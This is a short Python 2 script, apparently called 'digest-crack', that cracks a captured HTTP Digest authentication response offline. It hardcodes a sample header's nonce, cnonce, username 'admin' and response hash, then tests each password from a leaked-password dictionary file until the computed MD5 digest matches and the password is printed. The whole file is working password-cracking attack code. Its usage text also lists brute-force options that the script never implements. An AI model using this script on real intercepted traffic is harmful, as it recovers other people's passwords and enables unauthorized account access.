#!/usr/bin/env python
import os, sys, getopt, random, string, hashlib, itertools

cnonce = nonce = cnt = user = realm = qop = resp = uri = meth = ""
alpha = ""
plen = 0
#  Authorization: Digest username="admin", realm="Private Area", nonce="dUASPttqBQA=7f98746b6b66730448ee30eb2cd54d36d5b9ec0c", uri="/private/", algorithm=MD5, response="3823c96259b479bfa6737761e0f5f1ee", qop=auth, nc=00000001, cnonce="edba216c81ec879e" 

cnonce = 'edba216c81ec879e'
nonce = 'dUASPttqBQA=7f98746b6b66730448ee30eb2cd54d36d5b9ec0c'
cnt = '00000001'
user = 'admin'
realm = 'Private Area'
qop = 'auth'
meth = 'GET'
uri = '/private/'
resp = '3823c96259b479bfa6737761e0f5f1ee'

if len(alpha) == 0:
    alpha = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

if meth == "" or cnonce == "" or nonce == "" or cnt == "" or user == "" or realm == "" or resp == "" or uri == "":
    print 'Missing arguments.'
    print 'digest-crack --alpha char_string --length passwd_length --cnonce client_nonce --nonce server_nonce --count request_count --user username --realm realm --qop qop --response response --method http_method --uri uri'
    sys.exit(2)

ha2 = hashlib.md5()
ha2.update(meth.upper() + ":" + uri)
ha2hex = ha2.hexdigest()
pct = 0
with open("haveibeenpwned_leaked.dict", "r") as ins:
    for passwd in ins:
        passwd = passwd.strip()
        if pct % 1000 == 0:
            sys.stdout.write('.')

        pswd = "".join(passwd)
        ha1 = hashlib.md5()
        ha1.update(user + ':' + realm + ':' + pswd)
        ha3 = hashlib.md5()
        ha3.update(ha1.hexdigest() + ":" + nonce + ":" + cnt + ":" + cnonce + ":" + qop + ":" + ha2hex )
        if resp == ha3.hexdigest():
            print ''
            print "Password hit at",pct
            print resp,'==',ha3.hexdigest()
            print 'Password='+pswd
            break

        pct = pct + 1
print 'haha done!'